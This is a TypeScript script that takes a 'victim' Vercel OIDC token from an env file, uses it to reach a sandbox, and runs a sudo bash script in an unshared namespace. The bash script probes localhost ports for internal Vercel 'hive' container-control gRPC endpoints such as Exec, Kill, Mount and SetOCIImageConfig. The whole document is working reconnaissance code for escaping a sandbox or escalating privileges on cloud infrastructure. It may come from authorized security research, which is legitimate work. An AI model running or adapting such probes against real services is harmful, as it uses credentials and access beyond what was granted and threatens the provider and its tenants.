import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== probe gRPC service paths on 23456 ==="
for path in \\
  "/vercel.hive.cell.api.containers.v1.ContainersService/Exec" \\
  "/vercel.hive.cell.api.containers.v1.ContainersService/Wait" \\
  "/vercel.hive.cell.api.containers.v1.ContainersService/Kill" \\
  "/vercel.hive.cell.api.processes.v1.ProcessService/Start" \\
  "/vercel.hive.cell.api.processes.v1.ProcessService/Wait" \\
  "/vercel.hive.cell.api.processes.v1.ProcessService/Kill" \\
  "/vercel.hive.host.api.v1.HostService/GetOCIImageConfig" \\
  "/vercel.hive.host.api.v1.HostService/SetOCIImageConfig" \\
  "/vercel.hive.cell.api.v1.CelldService/GetInfo" \\
  "/vercel.hive.cell.api.v1.CelldService/Ping" \\
  "/vercel.hive.cell.api.v1.CellService/Info" \\
  "/vercel.hive.cell.api.drives.v1.DrivesService/List" \\
  "/vercel.hive.cell.api.drives.v1.DrivesService/Create" \\
  "/vercel.hive.cell.api.drives.v1.DrivesService/Mount" \\
  "/vercel.hive.cell.api.drives.v1.DrivesService/Attach" \\
  "/healthz" \\
  "/health" \\
  "/status" \\
  "/api/v1/status" \\
  "/metrics" \\
  "/version" \\
  "/debug/pprof/" \\
  "/startCellAPI" \\
  "/RegisterPort" \\
  "/SetWorkload" \\
  "/StartContainer" \\
  "/StopContainer" \\
  "/WaitContainer" \\
  ; do
  for port in 23456 30001 30002; do
    code=$(timeout 2 curl -s -o /tmp/probe_body -w "%{http_code}" --max-time 1.5 -X POST -H "Content-Type: application/json" -d '{}' "http://127.0.0.1:$port$path" 2>/dev/null)
    if [ "$code" != "000" ] && [ "$code" != "404" ]; then
      echo "*** $path on :$port -> HTTP $code"
      head -c 300 /tmp/probe_body; echo ""
    fi
  done
done
echo "probe done"
echo "=== connect-rpc GET probes ==="
for path in "/vercel.hive.cell.api.v1.CelldService/GetInfo" "/vercel.hive.host.api.v1.HostService/GetOCIImageConfig"; do
  for port in 23456 30001 30002; do
    code=$(timeout 2 curl -s -o /tmp/probe_body2 -w "%{http_code}" --max-time 1.5 "http://127.0.0.1:$port$path" 2>/dev/null)
    echo "GET $path on :$port -> HTTP $code"
    head -c 200 /tmp/probe_body2; echo ""
  done
done
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore34.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore34.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
